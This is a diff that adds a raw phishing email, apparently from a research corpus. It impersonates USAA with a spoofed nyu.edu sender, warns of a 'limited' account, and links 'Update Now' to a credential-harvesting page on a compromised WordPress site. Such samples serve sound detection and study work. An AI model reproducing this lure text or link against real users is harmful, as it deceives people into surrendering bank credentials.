@@ -1,0 +1,72 @@
+Return-Path: <info@nyu.edu>
+X-Original-To: jose@login.monkey.org
+Delivered-To: jose@login.monkey.org
+Received: from forward.b.hostedemail.com (forward.b.hostedemail.com [64.98.36.17])
+	by l.monkey.org (Postfix) with ESMTP id C8254F4005
+	for <jose@login.monkey.org>; Sat, 18 Jul 2015 13:11:29 -0500 (CDT)
+Received: from smtpin11.hostedemail.com (10.5.19.248.rfc1918.com [10.5.19.248])
+	by ofarelay01.b.hostedemail.com (Postfix) with SMTP id E313B34E356
+	for <jose@login.monkey.org>; Sat, 18 Jul 2015 18:11:08 +0000 (UTC)
+X-Forwarded-For: jose@monkey.org by Hostedemail
+Delivered-To: jose@monkey.org
+X-FDA: 70422170826.11.rake44_9e530774f628
+Authentication-Results: auth.b.hostedemail.com; dkim=none
+	reason="no signature"; dkim-adsp=none (insecure policy);
+	dkim-atps=neutral
+X-Spam-Summary: 50,0,0,cd0084482aae1be5,d41d8cd98f00b204,info@nyu.edu,:info@nyu.edu,RULES_HIT:41:72:152:355:379:962:967:969:983:988:989:1189:1208:1221:1260:1263:1313:1314:1336:1345:1381:1394:1395:1431:1436:1437:1516:1517:1518:1534:1538:1560:1575:1588:1592:1594:1711:1714:1730:1749:1777:1792:2194:2199:2525:2560:2563:2682:2685:2741:2859:2890:2895:2901:2933:2937:2939:2942:2945:2947:2951:2954:3022:3040:3138:3139:3140:3141:3142:3622:3690:3740:3865:3866:3867:3873:3934:3936:3938:3941:3944:3947:3950:3953:3956:3959:4037:4042:4362:5007:6261:6684:6688:6750:9025:9388:9908:10004:10400:11529:11658:11914:12043:12776:13110:13156:13163:13228:13229:13237:14037:14040:14596:21080,0,RBL:neutral,CacheIP:none,Bayesian:0.5,0.5,0.5,Netcheck:none,DomainCache:0,MSF:not bulk,SPF:fs,MSBL:0,DNSBL:neutral,Custom_rules:0:0:0
+X-HE-Tag: rake44_9e530774f628
+X-Filterd-Recvd-Size: 2090
+Received: from fox.seas.upenn.edu (renard.seas.upenn.edu [158.130.68.124])
+	by imf15.b.hostedemail.com (Postfix) with ESMTP
+	for <jose@monkey.org>; Sat, 18 Jul 2015 18:11:07 +0000 (UTC)
+Received: from Compostomaster.lrsm.upenn.edu (SEASNet-30-47.lrsm.upenn.edu [158.130.30.48])
+	by fox.seas.upenn.edu (8.14.5/8.14.5) with ESMTP id t6IHiiSI025784;
+	Sat, 18 Jul 2015 13:58:47 -0400
+Message-Id: <201507181758.t6IHiiSI025784@fox.seas.upenn.edu>
+Content-Type: multipart/alternative; boundary="===============0553639818=="
+MIME-Version: 1.0
+Subject: Account Limited
+To: ";." <info@nyu.edu>
+From: "USAA" <info@nyu.edu>
+Date: Sat, 18 Jul 2015 13:58:26 -0400
+X-Proofpoint-Virus-Version: vendor=nai engine=5400 definitions=5800 signatures=585085
+X-PP-Spam-Details: rule=add_spam_details policy=default score=96 spamscore=96 ipscore=0
+ suspectscore=26 phishscore=2 bulkscore=0 adultscore=0 classifier=spam
+ adjust=0 reason=mlx scancount=1 engine=7.0.1-1111160001
+ definitions=main-1507180305
+Status: RO
+X-Status: 
+X-Keywords:                 
+X-UID: 127
+
+You will not see this in a MIME-aware mail reader.
+--===============0553639818==
+Content-Type: text/plain; charset="utf-8"
+MIME-Version: 1.0
+Content-Transfer-Encoding: quoted-printable
+Content-Description: Mail message body
+
+Dear Customer,
+
+Your access to USAA Online Services has been limited.
+To re-gain full access to all of the great benefits, Please
+keep your account updated on our system.
+
+Update Now.
+
+Thank you,
+USAA.
+
+--===============0553639818==
+Content-Type: text/html; charset="utf-8"
+MIME-Version: 1.0
+Content-Transfer-Encoding: quoted-printable
+Content-Description: Mail message body
+
+<html><head><meta http-equiv=3D"Content-Type" content=3D"text/html; charset=
+=3Dutf-8"/></head>Dear Customer,<br><br>Your access to USAA Online Services=
+ has been limited.<br>To re-gain full access to all of the great benefits, =
+Please<br>keep your account updated on our system.<br><br><a href=3D"http:/=
+/cidrebioduperche.fr//wp-includes/Text/Diff/Renderer/wx.htm">Update Now.</a=
+><br><br>Thank you,<br>USAA.<br></html>
+--===============0553639818==--
